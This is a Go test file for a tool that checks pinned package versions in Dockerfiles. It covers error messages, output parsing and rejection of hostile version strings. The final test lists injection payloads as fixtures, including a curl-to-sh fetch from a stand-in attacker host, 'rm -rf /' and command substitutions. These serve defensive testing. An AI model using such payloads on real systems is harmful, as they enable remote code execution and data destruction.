package pins

import (
	"errors"
	"os"
	"os/exec"
	"strings"
	"testing"
)

// The runtime's stderr is the useful part of a lookup failure ("failed to
// connect to the docker API ..."); the Go error alone is only "exit status 1",
// which tells the user nothing about why every pin came back unknown.
func TestRunFailureDetail_PrefersProcessStderr(t *testing.T) {
	// The test binary rejects an unknown -test.* flag with a message on stderr
	// and a non-zero exit, giving a real *exec.ExitError without needing Docker.
	_, err := exec.Command(os.Args[0], "-test.definitely-not-a-flag").Output()
	var ee *exec.ExitError
	if !errors.As(err, &ee) {
		t.Fatalf("expected an *exec.ExitError from the probe process, got %T: %v", err, err)
	}

	got := runFailureDetail(err)
	if !strings.Contains(got, "definitely-not-a-flag") {
		t.Errorf("detail should carry the process's stderr, got %q", got)
	}
	if got == err.Error() {
		t.Errorf("detail fell back to the bare Go error %q instead of stderr", got)
	}
}

func TestRunFailureDetail_FallsBackToErrorText(t *testing.T) {
	err := errors.New("exec: \"docker\": executable file not found")
	if got := runFailureDetail(err); got != err.Error() {
		t.Errorf("non-exit errors should pass through unchanged, got %q", got)
	}
}

func TestLookupFailedError_MessageNamesImageRuntimeAndCause(t *testing.T) {
	e := &LookupFailedError{Image: "python:3.12-slim", Runtime: "docker", Detail: "daemon not running"}
	msg := e.Error()
	for _, want := range []string{"python:3.12-slim", "docker", "daemon not running"} {
		if !strings.Contains(msg, want) {
			t.Errorf("error message %q missing %q", msg, want)
		}
	}
}

func TestParseLookupOutput_SetsStatusAndAvailable(t *testing.T) {
	pins := []Pin{
		{Package: "curl", Version: "7.88.1-10", Status: StatusUnknown},
		{Package: "openssl", Version: "3.0.11-1", Status: StatusUnknown},
		{Package: "gone", Version: "1.0", Status: StatusUnknown},
	}
	out := []byte("UPDATE|curl|7.88.1-10|7.88.1-12\nCURRENT|openssl|3.0.11-1|3.0.11-1\nUNAVAILABLE|gone\n")
	got := parseLookupOutput(out, pins)

	if got[0].Status != StatusUpdateAvailable || got[0].Available != "7.88.1-12" {
		t.Errorf("curl: got %s/%q, want update-available/7.88.1-12", got[0].Status, got[0].Available)
	}
	if got[1].Status != StatusCurrent || got[1].Available != "3.0.11-1" {
		t.Errorf("openssl: got %s/%q, want current/3.0.11-1", got[1].Status, got[1].Available)
	}
	if got[2].Status != StatusUnavailable {
		t.Errorf("gone: got %s, want unavailable", got[2].Status)
	}
}

// Debian epochs contain ':'. With a ':'-delimited format the pinned epoch
// swallowed the available version ("2024a-0:1:2024b-0"); '|' keeps them apart.
func TestParseLookupOutput_KeepsEpochInVersion(t *testing.T) {
	pins := []Pin{{Package: "tzdata", Version: "1:2024a-0", Status: StatusUnknown}}
	got := parseLookupOutput([]byte("UPDATE|tzdata|1:2024a-0|1:2024b-0\n"), pins)
	if got[0].Status != StatusUpdateAvailable || got[0].Available != "1:2024b-0" {
		t.Errorf("got %s/%q, want update-available/1:2024b-0", got[0].Status, got[0].Available)
	}
}

// The lookup container runs on an image the user doesn't control, and the
// version it reports is written into the Dockerfile of an auto-opened PR.
// Anything that isn't a plain version string must be refused, or a hostile
// base image could inject Dockerfile instructions into that PR.
func TestParseLookupOutput_RejectsInjectedVersion(t *testing.T) {
	hostile := []string{
		"1.0 && curl https://evil.example/x.sh | sh",
		"1.0 RUN curl evil",
		"1.0\tRUN curl evil",
		"1.0;rm -rf /",
		"1.0|extra",
		"$(id)",
		"`id`",
		"",
	}
	for _, v := range hostile {
		pins := []Pin{{Package: "curl", Version: "7.88.1-10", Status: StatusUnknown}}
		got := parseLookupOutput([]byte("UPDATE|curl|7.88.1-10|"+v+"\n"), pins)
		if got[0].Status != StatusUnknown || got[0].Available != "" {
			t.Errorf("version %q: got status %s available %q, want it rejected (unknown, empty)",
				v, got[0].Status, got[0].Available)
		}
		if edits := PlanEdits(got); len(edits) != 0 {
			t.Errorf("version %q produced edits %+v; a rejected version must never reach the Dockerfile", v, edits)
		}
	}
}
